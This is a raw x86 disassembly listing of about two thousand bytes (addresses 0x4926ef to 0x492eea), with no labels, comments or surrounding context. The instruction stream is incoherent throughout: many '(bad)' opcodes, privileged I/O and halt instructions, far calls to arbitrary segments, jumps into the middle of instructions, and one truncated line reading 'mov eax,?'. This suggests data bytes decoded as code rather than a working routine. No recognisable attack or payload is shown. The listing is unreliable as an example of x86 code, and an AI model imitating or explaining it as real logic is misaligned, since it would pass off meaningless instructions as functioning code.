  4926ef:	push   ebx
  4926f0:	push   cs
  4926f1:	cmp    BYTE PTR [edi+0x2ae7d4b8],dl
  4926f7:	arpl   bp,sp
  4926f9:	sti    
  4926fa:	test   DWORD PTR [ebp-0x62c67564],eax
  492700:	jne    0x49272c
  492702:	(bad)  [esi+0x35]
  492705:	jo     0x49268e
  492707:	popf   
  492708:	mov    ah,0x2e
  49270a:	mov    esi,0xaa0eb085
  49270f:	les    edi,FWORD PTR [ecx]
  492711:	pushf  
  492712:	cmp    eax,0x1a268dd7
  492717:	sar    BYTE PTR [ebx-0x6d256ccc],cl
  49271d:	push   esi
  49271e:	lods   al,BYTE PTR ds:[esi]
  49271f:	call   0xa5003310
  492724:	addr16 in eax,0xc4
  492727:	(bad)  
  492728:	in     al,0x66
  49272a:	sub    al,BYTE PTR [ecx]
  49272c:	mov    DWORD PTR [ebx-0x1d],ebp
  49272f:	mov    cl,0xa
  492731:	rcr    BYTE PTR [ebx-0x62],cl
  492734:	cld    
  492735:	jle    0x4926e2
  492737:	pop    esp
  492738:	mov    ebp,0xc0b56a4b
  49273d:	or     al,0xf
  49273f:	mov    WORD PTR [ecx-0x1fbe72d2],ds
  492745:	hlt    
  492746:	sub    ch,al
  492748:	add    esp,DWORD PTR [eax+ebx*2+0x77]
  49274c:	(bad)  
  49274e:	movsx  eax,BYTE PTR [eax+0x46031b70]
  492755:	sub    BYTE PTR [eax-0x70],dh
  492758:	and    bl,BYTE PTR [edx]
  49275a:	call   0x84c12373
  49275f:	ret    0x1c90
  492762:	push   0x7
  492764:	sar    eax,0x4
  492767:	pop    edx
  492768:	inc    edx
  492769:	mov    al,ds:0x6d5b898b
  49276e:	pop    eax
  49276f:	xchg   DWORD PTR [eax],esp
  492771:	push   0xffffffb0
  492773:	cmp    bl,BYTE PTR [ebp-0x5a27cfc3]
  492779:	inc    ecx
  49277a:	cwde   
  49277b:	or     DWORD PTR [ebp-0x467014b],0xffffff97
  492782:	retf   
  492783:	in     eax,0xd2
  492785:	or     edi,DWORD PTR [eax-0x2b072730]
  49278b:	ins    DWORD PTR es:[edi],dx
  49278c:	sar    BYTE PTR ds:0xca8c6038,0xca
  492793:	xor    BYTE PTR [edx+ecx*2+0x7b],dh
  492797:	xchg   DWORD PTR [ebx],edx
  492799:	mov    edx,0x36740308
  49279e:	push   cs
  49279f:	outs   dx,BYTE PTR ds:[esi]
  4927a0:	sub    eax,ebx
  4927a2:	je     0x4927b9
  4927a4:	sbb    ah,BYTE PTR [edi+0x27]
  4927a7:	xchg   ebp,eax
  4927a8:	mov    BYTE PTR [edx-0x70],bl
  4927ab:	pushf  
  4927ac:	pop    edi
  4927ad:	cs xchg edi,eax
  4927af:	int3   
  4927b0:	pop    esi
  4927b1:	or     BYTE PTR [ebp+0x17],dl
  4927b4:	add    al,0x1
  4927b6:	sub    edi,0xd15a33e1
  4927bc:	sbb    eax,0x1415d109
  4927c1:	test   al,0x10
  4927c3:	pop    eax
  4927c4:	(bad)  
  4927c5:	test   al,0x2c
  4927c7:	call   0x8b11:0x29ed3842
  4927ce:	jg     0x4927cc
  4927d0:	adc    al,dl
  4927d2:	lock pop ebp
  4927d4:	cmp    al,0xb6
  4927d6:	add    BYTE PTR [ecx-0x8fb4496],cl
  4927dc:	sub    DWORD PTR [ebx-0x75],esp
  4927df:	inc    ecx
  4927e0:	or     DWORD PTR [edx],0x7e
  4927e3:	push   edi
  4927e4:	imul   eax,eax,0xa
  4927e7:	cs leave 
  4927e9:	mov    ss,eax
  4927eb:	ja     0x49281f
  4927ed:	lods   eax,DWORD PTR ds:[esi]
  4927ee:	shr    DWORD PTR [eiz*8-0x4eff4c5b],0x26
  4927f6:	fsubr  DWORD PTR ds:0x11f41327
  4927fc:	sbb    ah,BYTE PTR [ebp-0x1bd1f7eb]
  492802:	hlt    
  492803:	hlt    
  492804:	stc    
  492805:	inc    ecx
  492806:	jae    0x49287b
  492808:	pop    ebx
  492809:	sbb    al,0x74
  49280b:	push   edi
  49280c:	or     BYTE PTR [eax+0x74],ch
  49280f:	inc    esi
  492810:	ins    BYTE PTR es:[edi],dx
  492811:	je     0x49282b
  492813:	ja     0x492805
  492815:	mov    ebp,0xcf6604dd
  49281a:	or     BYTE PTR [ecx+0x3ee11200],ch
  492820:	ins    BYTE PTR es:[edi],dx
  492821:	and    esp,eax
  492823:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  492824:	jo     0x4927e6
  492826:	pusha  
  492827:	sub    eax,0x6bb5dbc6
  49282c:	dec    eax
  49282d:	sbb    DWORD PTR [bx+si],edx
  492830:	pop    ss
  492831:	and    BYTE PTR [ebp-0x6448bfca],bh
  492837:	push   es
  492838:	ss jne 0x49285a
  49283b:	js     0x4928bb
  49283d:	add    dh,BYTE PTR [eax+eax*1]
  492840:	mov    BYTE PTR [esp+ecx*4],0xb4
  492844:	sbb    esp,0x3346807d
  49284a:	xor    dh,BYTE PTR [eax-0x5a735b6d]
  492850:	xchg   esi,eax
  492851:	inc    edi
  492852:	imul   eax,DWORD PTR [ebx],0xc06470a7
  492858:	sbb    dl,BYTE PTR [eax]
  49285a:	imul   ebp,DWORD PTR [ecx+0x2e],0x6f2ea5cd
  492861:	and    eax,0x9a701c75
  492866:	dec    ebx
  492867:	jae    0x4928e1
  492869:	adc    ebx,DWORD PTR [eax+0xa]
  49286c:	cs (bad) 
  49286e:	test   eax,0x8ba064d2
  492873:	sbb    DWORD PTR [ecx-0x73],edx
  492876:	mov    ch,0xe8
  492878:	test   bh,0xea
  49287b:	sahf   
  49287c:	xchg   BYTE PTR [edx+0xc],bl
  49287f:	sar    DWORD PTR [ebx-0x43089637],1
  492885:	adc    edx,DWORD PTR ds:0xac0022f
  49288b:	sbb    al,0x53
  49288d:	out    0x8e,eax
  49288f:	dec    ebx
  492890:	stos   BYTE PTR es:[edi],al
  492891:	sbb    edx,DWORD PTR [edx+0x7e]
  492894:	sub    BYTE PTR [ecx+0x74],al
  492897:	adc    BYTE PTR [ebx+0xe],al
  49289a:	leave  
  49289b:	mov    esp,0x4e080659
  4928a0:	push   0x2c9284d2
  4928a5:	mov    edx,0x2df99890
  4928aa:	dec    esi
  4928ab:	nop
  4928ac:	mov    bl,0xf3
  4928ae:	inc    eax
  4928af:	adc    DWORD PTR [eax],0xffffffe6
  4928b2:	lea    ebx,[ebp-0x69b2d504]
  4928b8:	shr    BYTE PTR [edi],cl
  4928ba:	adc    al,0xf0
  4928bc:	test   DWORD PTR [ebx+0x74],esi
  4928bf:	jbe    0x492918
  4928c1:	jge    0x47bd4b59
  4928c7:	push   es
  4928c8:	arpl   WORD PTR [eax-0x1abe7090],cx
  4928ce:	push   ebx
  4928cf:	test   DWORD PTR [ebp+0x28e86030],0xd3b4ae6e
  4928d9:	xchg   DWORD PTR [esi+0x2f9a373f],eax
  4928df:	mov    eax,ebx
  4928e1:	loope  0x4928f8
  4928e3:	scas   al,BYTE PTR es:[edi]
  4928e4:	jnp    0x4928d2
  4928e6:	add    eax,0xb70251bb
  4928eb:	mov    gs,edi
  4928ed:	or     al,0xf6
  4928ef:	dec    ebx
  4928f0:	and    BYTE PTR [ebx],bl
  4928f2:	in     eax,0x94
  4928f4:	lock mov edx,0x56f7af19
  4928fa:	or     esp,DWORD PTR ds:[ecx+0x2ee05e90]
  492901:	or     eax,0x2629024e
  492906:	in     al,dx
  492907:	mov    ch,0x19
  492909:	and    cl,dh
  49290b:	pusha  
  49290c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49290d:	sub    al,0x8e
  49290f:	adc    BYTE PTR [edx+ecx*4-0x51bd32fa],bl
  492916:	sti    
  492917:	mov    dl,0x6
  492919:	adc    bh,BYTE PTR [ebp-0x62]
  49291c:	push   ecx
  49291d:	jne    0x492915
  49291f:	adc    al,0x59
  492921:	das    
  492922:	add    DWORD PTR [esi+0x46],eax
  492925:	push   esp
  492926:	ins    DWORD PTR es:[edi],dx
  492927:	cmp    DWORD PTR [edi],ecx
  492929:	xchg   BYTE PTR [edi],al
  49292b:	pop    edi
  49292c:	lahf   
  49292d:	jl     0x4928ff
  49292f:	xor    al,0x8a
  492931:	stc    
  492932:	xor    ah,cl
  492934:	cmc    
  492935:	enter  0x38da,0x98
  492939:	add    ch,BYTE PTR [eax]
  49293b:	xchg   edi,edx
  49293d:	shl    DWORD PTR [eax-0x5f0977d5],0x49
  492944:	mov    edx,0xc17043f2
  492949:	adc    BYTE PTR [esi+0x46f63336],ch
  49294f:	cmp    eax,0x53af79b5
  492954:	adc    ah,0x29
  492957:	test   DWORD PTR [ebp+eax*4-0x377a77be],esp
  49295e:	xchg   dh,ch
  492960:	outs   dx,DWORD PTR ds:[esi]
  492961:	test   DWORD PTR [ebp-0x74af147b],0xc985c60d
  49296b:	or     ch,dl
  49296d:	xor    al,0xa5
  49296f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  492970:	std    
  492971:	xor    cl,al
  492973:	or     al,0xfc
  492975:	lock mov ah,0xcb
  492978:	outs   dx,DWORD PTR ds:[esi]
  492979:	idiv   al
  49297b:	cmp    ecx,DWORD PTR [edi]
  49297d:	call   0x444:0xf641ebb8
  492984:	jb     0x4929bd
  492986:	inc    ebx
  492987:	(bad)  
  492988:	arpl   dx,di
  49298a:	inc    eax
  49298b:	cmp    DWORD PTR [ecx+0x78b49b5],ecx
  492991:	dec    ebx
  492992:	ret    
  492993:	xchg   esp,edx
  492995:	dec    edx
  492996:	std    
  492997:	dec    eax
  492998:	ret    0xe333
  49299b:	rcr    ebp,0xa2
  49299e:	xor    al,BYTE PTR [eax]
  4929a0:	mov    edi,0x1274677c
  4929a5:	cdq    
  4929a6:	jle    0x4929e1
  4929a8:	inc    ebx
  4929a9:	xchg   edi,eax
  4929aa:	push   cs
  4929ab:	cmp    DWORD PTR [ecx-0xf],edi
  4929ae:	push   esi
  4929af:	sbb    eax,0xf0d743ef
  4929b4:	pop    ss
  4929b5:	repz test DWORD PTR [eax+0x7d],edx
  4929b9:	sub    eax,0x1d365654
  4929be:	outs   dx,BYTE PTR ds:[esi]
  4929bf:	jo     0x4929b9
  4929c1:	add    eax,esp
  4929c3:	add    DWORD PTR [ebp+0x2],esp
  4929c6:	or     eax,0xbe8c02dd
  4929cb:	add    edx,DWORD PTR [ecx]
  4929cd:	addr16 mov ah,0xe9
  4929d0:	ss mov edx,0x609c3a2d
  4929d6:	je     0x492a49
  4929d8:	or     BYTE PTR [esi+0x74],ch
  4929db:	sub    BYTE PTR [ebx-0x7b],ah
  4929de:	mov    ds:0xe1988997,al
  4929e3:	ss sbb eax,0x2db77280
  4929e9:	ins    DWORD PTR es:[edi],dx
  4929ea:	cmp    al,BYTE PTR [esi+edx*4-0x7c9dce9f]
  4929f1:	adc    DWORD PTR [edx+ecx*4+0x55],edi
  4929f5:	mov    esi,DWORD PTR [edi]
  4929f7:	fbld   TBYTE PTR gs:0xdf0c885
  4929fe:	out    0x34,eax
  492a00:	arpl   WORD PTR [ebx+0x4e660c74],cx
  492a06:	sahf   
  492a07:	or     BYTE PTR [edx-0x37],cl
  492a0a:	xchg   ebx,eax
  492a0b:	pop    eax
  492a0c:	outs   dx,BYTE PTR ds:[esi]
  492a0d:	adc    eax,0xc0a49d16
  492a12:	adc    dh,BYTE PTR [edx-0x48]
  492a15:	mov    WORD PTR [esi-0x388574e7],gs
  492a1b:	enter  0x1cc5,0x8b
  492a1f:	and    DWORD PTR [edx-0x7a],edx
  492a22:	shl    DWORD PTR [eax-0x58aa7fc6],cl
  492a28:	xor    dl,ch
  492a2a:	data16 add BYTE PTR [ebx],dl
  492a2d:	jle    0x492a01
  492a2f:	mov    bh,0xd8
  492a31:	jne    0x492a49
  492a33:	add    BYTE PTR [edi-0x42a225b1],bh
  492a39:	push   edi
  492a3a:	addr16 jne 0x492a9a
  492a3d:	xchg   esp,eax
  492a3e:	hlt    
  492a3f:	jmp    0x492a92
  492a41:	cmp    DWORD PTR [edi],edx
  492a43:	jle    0x492a4b
  492a45:	jl     0x492a1b
  492a47:	rcr    DWORD PTR [ecx+ebp*2-0x7f],1
  492a4b:	mov    bh,0xf8
  492a4d:	jle    0x492a86
  492a4f:	shl    BYTE PTR [ecx+0x238073f4],0xc6
  492a56:	pop    ebp
  492a57:	scas   eax,DWORD PTR es:[edi]
  492a58:	push   eax
  492a59:	int3   
  492a5a:	rcl    BYTE PTR [esi],1
  492a5c:	mov    dh,0x48
  492a5e:	(bad)  
  492a5f:	int    0x10
  492a61:	or     eax,0x3ecbb849
  492a66:	mov    ebx,eax
  492a68:	jmp    0x492a74
  492a6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  492a6b:	jo     0x492a57
  492a6d:	mov    ds:0xf57ddaed,eax
  492a72:	lock dec eax
  492a74:	nop
  492a75:	cmp    eax,0x9410fc47
  492a7a:	mov    esp,0x7a783cb
  492a7f:	push   DWORD PTR [ebp-0x41f08d68]
  492a85:	dec    ecx
  492a87:	and    eax,0x173ddf7c
  492a8c:	xor    bl,BYTE PTR [ebp+0x32536b8d]
  492a92:	clc    
  492a93:	inc    eax
  492a94:	pop    eax
  492a95:	sub    ch,BYTE PTR [eax]
  492a97:	or     eax,0xb5bd8b81
  492a9c:	cli    
  492a9d:	adc    DWORD PTR [eax+0x7439aa00],eax
  492aa3:	sbb    eax,0xaf6ed268
  492aa8:	add    eax,0x53a51475
  492aad:	push   esi
  492aae:	xor    al,0x5c
  492ab0:	cmp    ebx,DWORD PTR ds:0x18cf9c81
  492ab6:	xor    BYTE PTR [ebx+0x30],al
  492ab9:	dec    edx
  492aba:	pop    eax
  492abb:	icebp  
  492abc:	xchg   DWORD PTR [eax+0x11752d3b],eax
  492ac2:	and    DWORD PTR [edx],ebp
  492ac4:	jle    0x492aef
  492ac6:	aad    0x22
  492ac8:	jg     0x492ab8
  492aca:	xchg   DWORD PTR [eax],ebx
  492acc:	data16 hlt 
  492ace:	push   ecx
  492acf:	push   ebx
  492ad0:	(bad)  
  492ad1:	dec    edi
  492ad2:	mov    DWORD PTR [ebp+0xa24fdbc],edx
  492ad8:	jae    0x492ac4
  492ada:	setl   BYTE PTR [edx]
  492add:	gs imul edi,esp,0x28778cfa
  492ae4:	jbe    0x492a74
  492ae6:	inc    esp
  492ae7:	mov    ebx,0x274333
  492aec:	loope  0x492b00
  492aee:	dec    edx
  492aef:	cmp    eax,0xf4b83eb4
  492af4:	sub    DWORD PTR ds:0x5830047f,ecx
  492afa:	data16 or ah,cl
  492afd:	push   ebp
  492afe:	adc    ecx,0xffffff85
  492b01:	or     cl,bh
  492b03:	call   0xe37ef926
  492b08:	retf   
  492b09:	pop    ebp
  492b0a:	sub    edx,edi
  492b0c:	outs   dx,BYTE PTR ds:[esi]
  492b0d:	bound  esp,QWORD PTR fs:[edx-0xf2d4ab3]
  492b14:	je     0x492b5a
  492b16:	inc    edx
  492b17:	pop    eax
  492b18:	xchg   BYTE PTR [eax],bl
  492b1a:	and    DWORD PTR [esi+edi*1],edx
  492b1d:	jle    0x492b12
  492b1f:	es mov dh,0x1a
  492b22:	jle    0x492b0f
  492b24:	cld    
  492b25:	or     bl,BYTE PTR [ecx+0x348b13eb]
  492b2b:	lods   eax,DWORD PTR ds:[esi]
  492b2c:	or     DWORD PTR [ebx],edi
  492b2e:	sub    DWORD PTR [ebx],eax
  492b30:	cdq    
  492b31:	pop    esp
  492b32:	ror    BYTE PTR [ecx+0x1b],cl
  492b35:	xor    DWORD PTR [esi],esi
  492b37:	imul   esp,DWORD PTR [ebx+0x307c176a],0x73
  492b3e:	adc    esp,edi
  492b40:	(bad)  
  492b41:	dec    ebp
  492b42:	sub    DWORD PTR [eax-0x2e],edi
  492b45:	add    bh,dh
  492b47:	fidivr DWORD PTR [ebx+0x5a1b9013]
  492b4d:	lds    edx,FWORD PTR [edx+0x6e7552ac]
  492b53:	(bad)  
  492b54:	jnp    0x492b4e
  492b56:	xor    BYTE PTR [ebp-0x39],bl
  492b59:	jge    0x492b67
  492b5b:	bndldx bnd2,[edx]
  492b5e:	jge    0x492b50
  492b60:	dec    edi
  492b61:	sbb    al,0x7
  492b63:	lahf   
  492b64:	daa    
  492b65:	mov    eax,ebx
  492b67:	or     eax,edi
  492b69:	jne    0x492b71
  492b6b:	and    esi,esi
  492b6d:	(bad)  
  492b6e:	rcr    BYTE PTR [ebp-0x44a7245],0x7a
  492b75:	das    
  492b76:	sbb    al,ah
  492b78:	scas   al,BYTE PTR es:[edi]
  492b79:	dec    edx
  492b7a:	jb     0x492b87
  492b7c:	cmp    BYTE PTR [esi],al
  492b7e:	inc    ebx
  492b7f:	je     0x492bae
  492b81:	mov    ebp,DWORD PTR [esi]
  492b83:	or     DWORD PTR [eax+ebp*8],edx
  492b86:	stc    
  492b87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  492b88:	push   edi
  492b89:	aas    
  492b8a:	or     dl,BYTE PTR ds:[esp+eax*1+0x3f8cca1c]
  492b92:	(bad)  
  492b93:	mov    ecx,0xf988a0ed
  492b98:	cmp    DWORD PTR [esi-0x774372fd],ebx
  492b9e:	push   cs
  492b9f:	dec    esi
  492ba0:	jmp    0x492b5f
  492ba2:	jecxz  0x492bba
  492ba4:	fsubr  QWORD PTR [ecx]
  492ba6:	sub    al,0x91
  492ba8:	sub    eax,esi
  492baa:	inc    esi
  492bab:	cmp    eax,0xabc7a8ea
  492bb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  492bb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  492bb2:	in     al,dx
  492bb3:	push   edi
  492bb4:	pop    edi
  492bb5:	enter  0xef29,0xec
  492bb9:	mov    edx,edx
  492bbb:	cmp    BYTE PTR [eax],0x30
  492bbe:	je     0x492c14
  492bc0:	shl    BYTE PTR [eax+ebp*8],1
  492bc3:	lock (bad) 
  492bc6:	add    bh,bh
  492bc8:	dec    ecx
  492bc9:	mov    BYTE PTR [eax],0x30
  492bcc:	jmp    0x492c0b
  492bce:	in     eax,dx
  492bcf:	xchg   esp,eax
  492bd0:	aas    
  492bd1:	push   eax
  492bd2:	sub    BYTE PTR [edx+0x55],cl
  492bd5:	mov    edi,0xa8694b26
  492bda:	or     BYTE PTR [ebx+0x46],bl
  492bdd:	mov    dh,BYTE PTR [edx+0x5bf7879d]
  492be3:	push   esi
  492be4:	repnz sub edi,DWORD PTR [edi]
  492be7:	sar    eax,1
  492be9:	int    0x6
  492beb:	mov    eax,0x365038cd
  492bf0:	push   eax
  492bf1:	test   DWORD PTR [eax-0xed475f9],ebp
  492bf7:	iret   
  492bf8:	jle    0x492b81
  492bfa:	test   eax,0x6a047463
  492bff:	sub    eax,0xe300eeb
  492c04:	sub    ebp,ebx
  492c06:	push   es
  492c07:	test   al,0x2
  492c09:	bnd jne 0x492c45
  492c0c:	cmp    bh,dl
  492c0e:	and    BYTE PTR [edx-0x27403378],ch
  492c14:	pop    ss
  492c15:	fisubr WORD PTR [ebp+0x2bd18b70]
  492c1b:	mov    ebp,0xecf50bec
  492c20:	or     bh,bh
  492c22:	xchg   edi,ebp
  492c24:	test   al,0xc
  492c26:	jne    0x492c4c
  492c28:	jmp    0x492c48
  492c2a:	and    ebp,DWORD PTR [esi-0x4]
  492c2d:	jle    0x492c11
  492c2f:	adc    DWORD PTR ds:0xcbd154f,esp
  492c35:	mov    ebp,DWORD PTR [edi+0x59]
  492c38:	out    0x44,al
  492c3a:	scas   eax,DWORD PTR es:[edi]
  492c3b:	popa   
  492c3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  492c3d:	jg     0x492c1d
  492c3f:	fsub   DWORD PTR [edi-0x76]
  492c42:	add    DWORD PTR [edi-0x19],eax
  492c45:	adc    cl,BYTE PTR [ebx+ecx*4]
  492c48:	lock int3 
  492c4a:	jae    0x492cc8
  492c4c:	push   ecx
  492c4d:	out    dx,al
  492c4e:	adc    esp,DWORD PTR [ebp-0x6a]
  492c51:	daa    
  492c52:	lods   eax,DWORD PTR ds:[esi]
  492c53:	or     BYTE PTR [eax-0x61],bh
  492c56:	push   ebp
  492c57:	inc    ecx
  492c58:	repnz das 
  492c5a:	adc    eax,0x8b267504
  492c5f:	retf   
  492c60:	rcl    BYTE PTR [esi],0xcf
  492c63:	mov    eax,ds:0x3cb7b660
  492c68:	mov    ebx,0xc8d34bb4
  492c6d:	int    0xe2
  492c6f:	inc    edx
  492c70:	aam    0x6b
  492c72:	mov    ah,0xec
  492c74:	mov    eax,DWORD PTR [edx]
  492c76:	ins    DWORD PTR es:[edi],dx
  492c77:	prefetch BYTE PTR [esi+0x61]
  492c7b:	jo     0x492c6d
  492c7d:	adc    DWORD PTR ds:0x302b9b8,ecx
  492c83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  492c84:	push   edi
  492c85:	push   eax
  492c86:	dec    ebx
  492c87:	stc    
  492c88:	pushf  
  492c89:	loopne 0x492c16
  492c8b:	xchg   BYTE PTR [esp+ecx*4-0x4d],al
  492c8f:	jle    0x492cb5
  492c91:	dec    eax
  492c92:	xor    eax,0x965fb94
  492c97:	cdq    
  492c98:	fst    st(7)
  492c9a:	add    edi,DWORD PTR [ebp-0x1fec05bf]
  492ca0:	xchg   ebp,eax
  492ca1:	cmp    bh,BYTE PTR [edi-0x50]
  492ca4:	jmp    0x492cd4
  492ca6:	adc    ah,BYTE PTR [esi]
  492ca8:	mov    WORD PTR [esi-0x15],es
  492cab:	and    eax,0xb82da0ac
  492cb0:	jge    0x492c55
  492cb2:	push   ss
  492cb3:	lock scas eax,DWORD PTR es:[edi]
  492cb5:	pushf  
  492cb6:	adc    eax,DWORD PTR [edx+0x2192a111]
  492cbc:	jl     0x492cf1
  492cbe:	push   ebx
  492cbf:	or     al,0x93
  492cc1:	pop    ss
  492cc2:	mov    eax,ds:0x8c652a74
  492cc7:	inc    edx
  492cc8:	inc    ecx
  492cc9:	imul   edx,DWORD PTR [ebx-0x3d3b895e],0xb80cfbf1
  492cd3:	mov    ch,0x11
  492cd5:	or     esp,DWORD PTR [ebp-0x7d74a6d9]
  492cdb:	xor    DWORD PTR [esi+0x3f],eax
  492cde:	ret    
  492cdf:	mov    bh,0x68
  492ce1:	or     ecx,DWORD PTR [esi+0x38]
  492ce4:	clc    
  492ce5:	xchg   ebx,eax
  492ce6:	hlt    
  492ce7:	mov    edx,DWORD PTR [ebp+0x776721a0]
  492ced:	call   0xd911d4c4
  492cf2:	sbb    BYTE PTR [ebx+edi*4-0x43],0xb4
  492cf7:	jge    0x492d59
  492cf9:	(bad)
  492cfc:	aaa    
  492cfd:	push   ds
  492cfe:	pop    ss
  492cff:	jmp    0x492cfc
  492d01:	daa    
  492d02:	outs   dx,BYTE PTR ds:[esi]
  492d03:	cmp    eax,0xcb906ff9
  492d08:	xchg   esp,eax
  492d09:	inc    ecx
  492d0a:	add    BYTE PTR [ebp+0x79e70692],dh
  492d10:	call   0x9d91:0x9344e74f
  492d17:	in     al,0xb8
  492d19:	jp     0x492cac
  492d1b:	mov    eax,0xa4d036ec
  492d20:	push   0x27
  492d22:	add    esp,DWORD PTR [esi-0x6a7317ff]
  492d28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  492d29:	lock xor esi,DWORD PTR [eax-0x6b]
  492d2d:	shl    DWORD PTR [ebx-0x3c3e745e],0x48
  492d34:	call   0x13e8:0x189fa65c
  492d3b:	ficom  DWORD PTR [eax+0x77ed0430]
  492d41:	verw   WORD PTR [edi]
  492d44:	add    dh,BYTE PTR [eax+0xb808bc0]
  492d4a:	jmp    0x492dc1
  492d4c:	test   eax,0xa30e00ff
  492d51:	clc    
  492d52:	mov    BYTE PTR [ebp-0x7],bl
  492d55:	mov    BYTE PTR [ebp-0x6],0xc8
  492d59:	aas    
  492d5a:	add    BYTE PTR [esi+eiz*2],bl
  492d5d:	mov    eax,?
  492d5f:	mov    BYTE PTR [ebp-0x7],0x0
  492d63:	loopne 0x492d06
  492d65:	ss adc al,0x4
  492d68:	add    al,0xf4
  492d6a:	test   BYTE PTR [edx-0x728e1463],cl
  492d70:	daa    
  492d71:	sub    eax,0xf420d4f7
  492d77:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  492d79:	lahf   
  492d7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  492d7b:	cmp    BYTE PTR [ebp-0xc],al
  492d7e:	or     dh,al
  492d80:	jmp    0x492d96
  492d82:	add    al,BYTE PTR [edi]
  492d84:	or     BYTE PTR [edi+0xc452318],0x8d
  492d8b:	lahf   
  492d8c:	lods   eax,DWORD PTR ds:[esi]
  492d8d:	mov    eax,ds:0xe455e7b2
  492d92:	adc    al,0x56
  492d94:	push   0x57a74853
  492d99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  492d9a:	jmp    0x2a59:0xc4553906
  492da1:	mov    al,ds:0x1edb12de
  492da6:	pop    esi
  492da7:	call   0x328fd056
  492dac:	rcr    ebp,1
  492dae:	sub    sp,WORD PTR [ebp-0x14199ef9]
  492db5:	shr    BYTE PTR [eax-0x3ff2fe8a],1
  492dbb:	mov    al,0xc9
  492dbd:	sbb    edx,esp
  492dbf:	jle    0x492dbc
  492dc1:	stc    
  492dc2:	and    eax,DWORD PTR [ebp+0x7cf2d46f]
  492dc8:	add    DWORD PTR [esi-0x77],esp
  492dcb:	add    al,0xb1
  492dcd:	cmp    DWORD PTR [edi+0x4f27b660],0x22ebee75
  492dd7:	mov    ebx,DWORD PTR [eax+0x25]
  492dda:	pusha  
  492ddb:	sub    eax,0x3a0c2e35
  492de0:	pop    es
  492de1:	add    dh,bh
  492de3:	push   DWORD PTR [edi]
  492de5:	je     0x492ded
  492de7:	dec    edi
  492de8:	je     0x492ded
  492dea:	dec    ebx
  492deb:	jne    0x492dd8
  492ded:	mov    al,ds:0xb7c05665
  492df2:	test   DWORD PTR [ecx+edi*2-0x6f090e8d],esp
  492df9:	jb     0x492d8c
  492dfb:	adc    al,0x6a
  492dfd:	push   eax
  492dfe:	sub    al,0x44
  492e00:	dec    edx
  492e01:	(bad)  
  492e02:	pop    eax
  492e03:	pushf  
  492e04:	or     BYTE PTR [ecx+0x498eae7b],ch
  492e0a:	enter  0x8ee7,0x63
  492e0e:	add    DWORD PTR [ebp-0x4b66ed7d],ecx
  492e14:	leave  
  492e15:	popw   ss
  492e17:	sub    al,0xb8
  492e19:	je     0x492e20
  492e1b:	cmp    DWORD PTR [esi+0x77],ebp
  492e1e:	sbb    BYTE PTR [ebx+0x59],ch
  492e21:	dec    eax
  492e22:	push   eax
  492e23:	aam    0xe0
  492e25:	push   ecx
  492e26:	push   edx
  492e27:	xor    eax,0xfb5e0d90
  492e2c:	gs loop 0x492e0c
  492e2f:	mov    dl,0x2
  492e31:	pop    esi
  492e32:	cmp    ecx,edi
  492e34:	or     BYTE PTR [ecx],0x66
  492e37:	push   cs
  492e38:	imul   esi,DWORD PTR [edi],0xde5c8280
  492e3e:	clc    
  492e3f:	jbe    0xc1481ad5
  492e45:	add    DWORD PTR [edx+ebp*2],0x59c6033a
  492e4c:	push   cs
  492e4d:	or     al,BYTE PTR [eax]
  492e4f:	mov    dh,0xff
  492e51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  492e52:	sub    bh,BYTE PTR [ebx+edi*1]
  492e55:	cmp    WORD PTR [ecx],di
  492e58:	je     0x492e90
  492e5a:	inc    ebx
  492e5b:	cmp    ebx,DWORD PTR [ebp+0x44]
  492e5e:	or     DWORD PTR [ecx+0x4a9f67f7],0xfffffff9
  492e65:	mov    DWORD PTR [eax],edx
  492e67:	add    ecx,esi
  492e69:	xor    BYTE PTR ds:[ebp-0x19],dh
  492e6d:	sub    ecx,esi
  492e6f:	mov    eax,ds
  492e71:	mov    ebx,0xf983e89b
  492e76:	das    
  492e77:	xchg   esp,eax
  492e78:	or     BYTE PTR [esp+esi*2+0xe],bl
  492e7c:	dec    edi
  492e7d:	jae    0x492ee4
  492e7f:	push   0x5c
  492e81:	or     edx,0xffffffb7
  492e84:	out    dx,eax
  492e85:	sbb    BYTE PTR [bx],dl
  492e88:	jmp    0x492e9a
  492e8a:	sub    eax,0x3c6754e
  492e8f:	into   
  492e90:	add    BYTE PTR [edi],0xf5
  492e93:	mov    ah,0xeb
  492e95:	cmp    bl,BYTE PTR [edx+esi*1]
  492e98:	int3   
  492e99:	stc    
  492e9a:	daa    
  492e9b:	js     0x492e3e
  492e9d:	xor    ch,BYTE PTR [edx]
  492e9f:	cmp    edx,0x2e
  492ea2:	es push ecx
  492ea4:	and    eax,0xb45a2e6a
  492ea9:	pop    ebx
  492eaa:	enter  0x716d,0x15
  492eae:	sub    DWORD PTR [esi+0x14],esi
  492eb1:	js     0x492e63
  492eb3:	popa   
  492eb4:	xor    DWORD PTR [edi],0x23
  492eb7:	mov    esp,0x8007168f
  492ebc:	jno    0x492ece
  492ebe:	out    dx,eax
  492ebf:	jns    0x492e8c
  492ec1:	push   ds
  492ec2:	pop    edi
  492ec3:	dec    edx
  492ec4:	stc    
  492ec5:	shl    esi,cl
  492ec7:	dec    eax
  492ec8:	jmp    0x7ceef56e
  492ecd:	aas    
  492ece:	shr    bl,1
  492ed0:	paddq  mm1,QWORD PTR ds:0x604774c2
  492ed7:	pop    esp
  492ed8:	inc    DWORD PTR ds:0x271a88
  492ede:	pusha  
  492edf:	dec    esp
  492ee0:	push   DWORD PTR [ebp+0x4e]
  492ee3:	push   ebx
  492ee4:	xchg   ecx,eax
  492ee5:	inc    esi
  492ee6:	aaa    
  492ee7:	scas   al,BYTE PTR es:[edi]
  492ee8:	cmp    al,0x85
  492eea:	jo     0x492ed0
